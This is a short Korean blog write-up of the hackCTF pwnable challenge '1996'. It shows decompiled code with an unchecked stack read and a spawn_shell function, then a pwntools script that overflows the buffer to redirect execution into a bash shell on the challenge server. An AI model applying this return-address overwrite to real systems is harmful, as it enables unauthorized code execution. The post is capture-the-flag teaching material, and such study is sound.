---
layout: post
title:  "[hackCTF]1996"
date:   2020-02-18
---

hackCTF pwnable 14번째 문제

![favicon](https://drive.google.com/uc?id=1EPkDaLZatWWYaPyJ3wVlOrAu-eubvG9c)

## ida - main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  __int64 v4; // rax
  __int64 v5; // rdx
  __int64 v6; // rbx
  char *v7; // rax
  __int64 v8; // rdx
  __int64 v9; // rax
  char name; // [rsp+0h] [rbp-410h]

  std::operator<<<std::char_traits<char>>(&_bss_start, "Which environment variable do you want to read? ", envp);
  std::operator>><char,std::char_traits<char>>(&std::cin, &name);
  v4 = std::operator<<<std::char_traits<char>>(&_bss_start, &name, v3);
  v6 = std::operator<<<std::char_traits<char>>(v4, "=", v5);
  v7 = getenv(&name);
  v9 = std::operator<<<std::char_traits<char>>(v6, v7, v8);
  std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
  return 0;
}
```

## ida - spawn_shell(void)
```c
int spawn_shell(void)
{
  char *argv; // [rsp+0h] [rbp-10h]
  __int64 v2; // [rsp+8h] [rbp-8h]

  argv = "/bin/bash";
  v2 = 0LL;
  return execve("/bin/bash", &argv, 0LL); // 쉘을 띄울 수 있다
}
```

main함수는 문자열을 입력 받아 그 값이 환경변수이면 경로를 출력한다. spawn_shell 함수는 flag를 출력하므로 main 함수의 ret을 spawn_shell의 주소로 덮어 문제를 해결하자.

## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3013)

payload = "A"*0x418+p64(0x400897)

p.sendline(payload)

p.interactive()
```

## 결과
![1401](https://drive.google.com/uc?id=1c29YhzXiygH5fvEJk--Dkb5xEoBiBW7d)
